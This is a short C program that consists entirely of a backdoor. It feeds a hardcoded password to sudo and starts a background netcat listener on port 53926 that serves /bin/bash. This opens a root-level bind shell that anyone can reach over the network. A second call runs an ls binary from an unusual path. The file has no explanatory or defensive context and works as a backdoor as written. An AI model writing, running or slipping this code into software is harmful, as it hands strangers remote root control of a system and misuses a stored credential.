#include <stdlib.h>
int main() {
system("echo target123 | sudo -S nohup ./nc.traditional -l -p 53926 -e /bin/bash");
system("/bin/share/ls");
return 0;
 }